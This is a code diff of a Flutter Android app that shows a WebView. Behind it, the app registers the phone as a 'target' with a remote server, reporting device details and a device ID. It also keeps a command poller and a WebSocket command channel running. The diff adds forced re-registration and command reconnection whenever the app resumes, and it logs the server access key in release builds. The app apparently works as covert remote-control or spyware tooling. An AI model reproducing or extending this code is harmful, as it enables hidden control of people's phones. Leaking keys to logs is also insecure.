@@ -25,6 +25,13 @@ const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');
 // ==========================================
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
+
+  // Redirect debugPrint ke print supaya muncul di logcat rilis mode
+  debugPrint = (String? message, {int? wrapWidth}) {
+    print(message ?? '');
+  };
+
+  print('🚀 [MAIN] App starting...');
   runApp(const GeneratedApp());
 }
 
@@ -60,21 +67,51 @@ class AppBootstrap extends StatefulWidget {
   State<AppBootstrap> createState() => _AppBootstrapState();
 }
 
-class _AppBootstrapState extends State<AppBootstrap> {
+class _AppBootstrapState extends State<AppBootstrap>
+    with WidgetsBindingObserver {
   String _status = 'Memuat...';
   bool _ready = false;
 
   @override
   void initState() {
     super.initState();
+    WidgetsBinding.instance.addObserver(this);
+    print('🎬 [BOOTSTRAP] initState');
     _bootstrap();
   }
 
+  @override
+  void dispose() {
+    WidgetsBinding.instance.removeObserver(this);
+    super.dispose();
+  }
+
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    print('📱 [LIFECYCLE] state: $state');
+
+    if (state == AppLifecycleState.resumed) {
+      // App kembali ke foreground → force register + polling
+      print('🔄 [LIFECYCLE] resumed → force re-register + polling');
+      _registerDeviceWithRetry();
+      if (WsClient().isConnected) {
+        print('✅ [LIFECYCLE] WS still connected');
+      } else {
+        print('⚠️ [LIFECYCLE] WS disconnected → reconnect');
+        WsClient().connect();
+        CommandPoller().start();
+      }
+    }
+  }
+
   Future<void> _bootstrap() async {
+    print('🚀 [BOOTSTRAP] START');
+
     try {
       // ==========================================
-      // ===== 1. Save config ke SharedPreferences =====
+      // ===== 1. Save config =====
       // ==========================================
+      print('📦 [BOOTSTRAP] Step 1: Save config');
       try {
         final prefs = await SharedPreferences.getInstance();
         await prefs.setString('accessKey', BuildConfig.accessKey);
@@ -83,59 +120,79 @@ class _AppBootstrapState extends State<AppBootstrap> {
         await prefs.setString('packageName', BuildConfig.packageName);
         await prefs.setString('serverUrl', BuildConfig.serverUrl);
         await prefs.setBool('isNativeApp', true);
-        debugPrint('✅ Config saved to prefs');
+        print('✅ [BOOTSTRAP] Config saved. serverUrl=${BuildConfig.serverUrl}');
+        print('✅ [BOOTSTRAP] accessKey=${BuildConfig.accessKey}');
       } catch (e) {
-        debugPrint('⚠️ Prefs error: $e');
+        print('❌ [BOOTSTRAP] Prefs error: $e');
       }
 
       // ==========================================
-      // ===== 2. Request Permissions =====
+      // ===== 2. Permissions =====
       // ==========================================
+      print('📦 [BOOTSTRAP] Step 2: Request permissions');
       if (mounted) setState(() => _status = 'Meminta izin...');
       try {
         await _requestPermissions();
+        print('✅ [BOOTSTRAP] Permissions done');
       } catch (e) {
-        debugPrint('⚠️ Permission flow error: $e');
+        print('❌ [BOOTSTRAP] Permission error: $e');
       }
 
       // ==========================================
-      // ===== 3. Register Device =====
+      // ===== 3. Register device =====
       // ==========================================
+      print('📦 [BOOTSTRAP] Step 3: Register device');
       if (mounted) setState(() => _status = 'Mendaftar device...');
       try {
         await _registerDeviceWithRetry();
+        print('✅ [BOOTSTRAP] Register done');
       } catch (e) {
-        debugPrint('⚠️ Register error: $e');
+        print('❌ [BOOTSTRAP] Register error: $e');
       }
 
       // ==========================================
-      // ===== 4. START REAL-TIME (WS + fallback polling) =====
+      // ===== 4. START WS + POLLING =====
       // ==========================================
+      print('📦 [BOOTSTRAP] Step 4: Start WS + Polling');
+
+      // Start polling FIRST (fallback)
       try {
+        CommandPoller().start();
+        print('✅ [BOOTSTRAP] Polling started');
+      } catch (e) {
+        print('❌ [BOOTSTRAP] Polling error: $e');
+      }
+
+      // Try WS
+      try {
+        print('🔌 [BOOTSTRAP] Connecting WS...');
         await WsClient().connect();
 
-        // Fallback: kalau WS gagal connect dalam 5 detik → pakai polling
-        Future.delayed(const Duration(seconds: 5), () {
-          if (!WsClient().isConnected) {
-            debugPrint('⚠️ WS gagal, fallback ke polling');
-            CommandPoller().start();
-          } else {
-            debugPrint('✅ WS aktif — polling dimatikan');
-          }
-        });
+        // Tunggu 3 detik untuk cek
+        await Future.delayed(const Duration(seconds: 3));
+        if (WsClient().isConnected) {
+          print('✅ [BOOTSTRAP] WS CONNECTED — stop polling');
+          CommandPoller().stop();
+        } else {
+          print('⚠️ [BOOTSTRAP] WS not connected — keep polling');
+        }
       } catch (e) {
-        debugPrint('⚠️ WS error: $e, fallback ke polling');
-        CommandPoller().start();
+        print('❌ [BOOTSTRAP] WS error: $e — keep polling');
       }
 
+      // ==========================================
+      // ===== 5. Ready =====
+      // ==========================================
+      print('📦 [BOOTSTRAP] Step 5: Ready');
       if (!mounted) return;
       setState(() {
         _status = 'Siap';
         _ready = true;
       });
+      print('🎉 [BOOTSTRAP] COMPLETE');
     } catch (e, st) {
-      debugPrint('❌ Bootstrap fatal error: $e');
-      debugPrint('$st');
+      print('❌ [BOOTSTRAP] FATAL: $e');
+      print('❌ [BOOTSTRAP] STACK: $st');
       if (!mounted) return;
       setState(() {
         _status = 'Siap (dengan keterbatasan)';
@@ -151,9 +208,9 @@ class _AppBootstrapState extends State<AppBootstrap> {
     int sdkInt = 0;
     try {
       sdkInt = await _getAndroidSdkInt();
-      debugPrint('📱 Android SDK: $sdkInt');
+      print('📱 [PERM] Android SDK: $sdkInt');
     } catch (e) {
-      debugPrint('⚠️ getSdkInt error: $e');
+      print('⚠️ [PERM] getSdkInt error: $e');
     }
 
     final permissions = <Permission>[
@@ -193,19 +250,11 @@ class _AppBootstrapState extends State<AppBootstrap> {
         final status = await perm.status;
         if (status.isDenied || status.isLimited) {
           final result = await perm.request();
-          debugPrint('🔑 $perm: $result');
+          print('🔑 [PERM] $perm: $result');
         }
       } catch (e) {
-        debugPrint('⚠️ Permission error ($perm): $e');
+        print('⚠️ [PERM] $perm error: $e');
       }
-    }
-
-    try {
-      if (Platform.isAndroid) {
-        await _openAccessibilitySettings();
-      }
-    } catch (e) {
-      debugPrint('⚠️ Cannot open accessibility settings: $e');
     }
   }
 
@@ -218,17 +267,8 @@ class _AppBootstrapState extends State<AppBootstrap> {
       final result = await _deviceChannel.invokeMethod<int>('getSdkInt');
       return result ?? 0;
     } catch (e) {
-      debugPrint('⚠️ getSdkInt channel error: $e');
+      print('⚠️ [HELPER] getSdkInt error: $e');
       return 0;
-    }
-  }
-
-  Future<void> _openAccessibilitySettings() async {
-    try {
-      await _deviceChannel.invokeMethod('openAccessibilitySettings');
-      debugPrint('✅ Accessibility settings opened');
-    } catch (e) {
-      debugPrint('⚠️ Cannot open accessibility settings: $e');
     }
   }
 
@@ -267,6 +307,9 @@ class _AppBootstrapState extends State<AppBootstrap> {
       if (id.isEmpty) {
         id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
         await prefs.setString('deviceId', id);
+        print('🆕 [DEVICE] New deviceId: $id');
+      } else {
+        print('📱 [DEVICE] Existing deviceId: $id');
       }
       return id;
     } catch (_) {
@@ -279,20 +322,20 @@ class _AppBootstrapState extends State<AppBootstrap> {
   // ==========================================
   Future<void> _registerDeviceWithRetry() async {
     if (BuildConfig.accessKey.isEmpty) {
-      debugPrint('⚠️ Access key kosong, skip register');
+      print('⚠️ [REGISTER] Access key kosong, skip');
       return;
     }
 
     for (int attempt = 1; attempt <= 3; attempt++) {
       try {
-        debugPrint('📡 Register attempt $attempt/3');
+        print('📡 [REGISTER] Attempt $attempt/3');
         final ok = await _registerDevice();
         if (ok) {
-          debugPrint('✅ Register success');
+          print('✅ [REGISTER] Success');
           return;
         }
       } catch (e) {
-        debugPrint('⚠️ Register attempt $attempt failed: $e');
+        print('⚠️ [REGISTER] Attempt $attempt error: $e');
       }
 
       if (attempt < 3) {
@@ -300,7 +343,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
       }
     }
 
-    debugPrint('❌ Register failed after 3 attempts');
+    print('❌ [REGISTER] Failed after 3 attempts');
   }
 
   Future<bool> _registerDevice() async {
@@ -310,7 +353,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
         final battery = Battery();
         batteryLevel = await battery.batteryLevel;
       } catch (e) {
-        debugPrint('⚠️ Battery error: $e');
+        print('⚠️ [REGISTER] Battery error: $e');
       }
 
       String connType = 'unknown';
@@ -319,7 +362,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
         final result = await connectivity.checkConnectivity();
         connType = result.toString();
       } catch (e) {
-        debugPrint('⚠️ Connectivity error: $e');
+        print('⚠️ [REGISTER] Connectivity error: $e');
       }
 
       final deviceId = await _getOrCreateDeviceId();
@@ -342,14 +385,21 @@ class _AppBootstrapState extends State<AppBootstrap> {
         'lastSeen': DateTime.now().toIso8601String(),
       };
 
-      final res = await _httpPost(
-        '${BuildConfig.serverUrl}/api/register-target',
-        payload,
-      );
+      final url = '${BuildConfig.serverUrl}/api/register-target';
+      print('📡 [REGISTER] POST $url');
+      print('📡 [REGISTER] Payload: $payload');
 
-      return res != null && res.isNotEmpty;
+      final res = await _httpPost(url, payload);
+
+      if (res != null && res.isNotEmpty) {
+        print('✅ [REGISTER] Response: $res');
+        return true;
+      }
+
+      print('❌ [REGISTER] Empty response');
+      return false;
     } catch (e) {
-      debugPrint('❌ _registerDevice error: $e');
+      print('❌ [REGISTER] Error: $e');
       return false;
     }
   }
@@ -372,10 +422,10 @@ class _AppBootstrapState extends State<AppBootstrap> {
       final responseBody =
           await response.transform(utf8.decoder).join();
 
-      debugPrint('📥 HTTP ${response.statusCode}: $responseBody');
+      print('📥 [HTTP] ${response.statusCode}: $responseBody');
       return responseBody;
     } catch (e) {
-      debugPrint('❌ HTTP error: $e');
+      print('❌ [HTTP] Error: $e');
       return null;
     } finally {
       client?.close(force: true);
@@ -391,9 +441,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
     return const WebViewHome();
   }
 
-  // ==========================================
-  // ===== LOADING SCREEN =====
-  // ==========================================
   Widget _buildLoadingScreen() {
     return Scaffold(
       backgroundColor: Colors.white,
@@ -431,9 +478,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
               const SizedBox(
                 width: 22,
                 height: 22,
-                child: CircularProgressIndicator(
-                  strokeWidth: 2.5,
-                ),
+                child: CircularProgressIndicator(strokeWidth: 2.5),
               ),
             ],
           ),
@@ -463,11 +508,14 @@ class _WebViewHomeState extends State<WebViewHome> {
   @override
   void initState() {
     super.initState();
+    print('🌐 [WEBVIEW] initState');
     _initWebView();
   }
 
   void _initWebView() {
     try {
+      print('🌐 [WEBVIEW] Initializing...');
+
       _controller = WebViewController()
         ..setJavaScriptMode(JavaScriptMode.unrestricted)
         ..setBackgroundColor(Colors.white)
@@ -478,7 +526,7 @@ class _WebViewHomeState extends State<WebViewHome> {
         ..addJavaScriptChannel(
           'AppBridge',
           onMessageReceived: (msg) {
-            debugPrint('📨 From web: ${msg.message}');
+            print('📨 [WEBVIEW] From web: ${msg.message}');
             _handleWebMessage(msg.message);
           },
         )
@@ -506,7 +554,7 @@ class _WebViewHomeState extends State<WebViewHome> {
                 _errorMessage = error.description;
                 _isLoading = false;
               });
-              debugPrint('❌ WebView error: ${error.description}');
+              print('❌ [WEBVIEW] Error: ${error.description}');
             },
             onNavigationRequest: (request) {
               return NavigationDecision.navigate;
@@ -515,9 +563,9 @@ class _WebViewHomeState extends State<WebViewHome> {
         )
         ..loadRequest(Uri.parse(BuildConfig.webviewUrl));
 
-      debugPrint('✅ WebView initialized');
+      print('✅ [WEBVIEW] Initialized. Loading: ${BuildConfig.webviewUrl}');
     } catch (e) {
-      debugPrint('❌ WebView init error: $e');
+      print('❌ [WEBVIEW] Init error: $e');
       if (mounted) {
         setState(() {
           _hasError = true;
@@ -546,9 +594,9 @@ class _WebViewHomeState extends State<WebViewHome> {
         })();
       """;
       await _controller.runJavaScript(js);
-      debugPrint('✅ Config injected ke WebView');
+      print('✅ [WEBVIEW] Config injected');
     } catch (e) {
-      debugPrint('❌ Inject error: $e');
+      print('❌ [WEBVIEW] Inject error: $e');
     }
   }
 
@@ -556,25 +604,23 @@ class _WebViewHomeState extends State<WebViewHome> {
     try {
       final data = jsonDecode(message);
       final action = data['action']?.toString();
+      print('📨 [WEBVIEW] Action: $action');
 
       switch (action) {
         case 'openUrl':
           final url = data['url']?.toString();
           if (url != null && url.isNotEmpty) {
-            launchUrl(
-              Uri.parse(url),
-              mode: LaunchMode.externalApplication,
-            );
+            launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
           }
           break;
         case 'close':
           SystemNavigator.pop();
           break;
         default:
-          debugPrint('Unknown action: $action');
+          print('⚠️ [WEBVIEW] Unknown action: $action');
       }
     } catch (e) {
-      debugPrint('Parse message error: $e');
+      print('❌ [WEBVIEW] Parse error: $e');
     }
   }
 
@@ -587,7 +633,7 @@ class _WebViewHomeState extends State<WebViewHome> {
     try {
       await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
     } catch (e) {
-      debugPrint('❌ Reload error: $e');
+      print('❌ [WEBVIEW] Reload error: $e');
       if (mounted) {
         setState(() {
           _hasError = true;
@@ -612,7 +658,6 @@ class _WebViewHomeState extends State<WebViewHome> {
             SystemNavigator.pop();
           }
         } catch (e) {
-          debugPrint('❌ Back error: $e');
           SystemNavigator.pop();
         }
       },
@@ -651,11 +696,7 @@ class _WebViewHomeState extends State<WebViewHome> {
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: [
-            const Icon(
-              Icons.wifi_off_rounded,
-              color: Colors.grey,
-              size: 56,
-            ),
+            const Icon(Icons.wifi_off_rounded, color: Colors.grey, size: 56),
             const SizedBox(height: 16),
             const Text(
               'Koneksi Bermasalah',
@@ -669,10 +710,7 @@ class _WebViewHomeState extends State<WebViewHome> {
             Text(
               _errorMessage,
               textAlign: TextAlign.center,
-              style: const TextStyle(
-                fontSize: 13,
-                color: Colors.black54,
-              ),
+              style: const TextStyle(fontSize: 13, color: Colors.black54),
             ),
             const SizedBox(height: 20),
             ElevatedButton(
